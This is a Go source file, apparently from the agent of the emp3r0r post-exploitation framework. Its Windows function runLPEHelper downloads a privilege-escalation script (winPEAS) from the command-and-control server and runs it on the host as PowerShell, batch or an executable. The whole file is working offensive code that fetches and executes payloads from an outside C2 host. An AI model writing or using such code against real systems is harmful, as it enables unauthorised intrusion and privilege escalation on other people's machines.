//go:build windows
// +build windows

package agent

import (
	"fmt"
	"log"
	"strings"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
)

func runLPEHelper(method string) (out string) {
	if !strings.HasPrefix(method, "lpe_winpeas") {
		return "Only lpe_winpeas* is supported for now"
	}

	log.Printf("Downloading LPE script from %s", emp3r0r_data.CCAddress+method)
	var scriptData []byte
	scriptData, err := DownloadViaCC(method, "")
	if err != nil {
		return "Download error: " + err.Error()
	}

	// run the script
	log.Printf("Running LPE helper %s", method)
	file_type := strings.Split(method, ".")[len(strings.Split(method, "."))-1]
	switch file_type {
	case "ps1":
		out, err = RunPSScript(scriptData)
		if err != nil {
			return fmt.Sprintf("LPE error: %s\n%v", out, err)
		}
	case "bat":
		out, err = RunBatchScript(scriptData)
		if err != nil {
			return fmt.Sprintf("LPE error: %s\n%v", out, err)
		}
	case "exe":
		out, err = RunExe(scriptData)
		if err != nil {
			return fmt.Sprintf("LPE error: %s\n%v", out, err)
		}
	}

	return
}
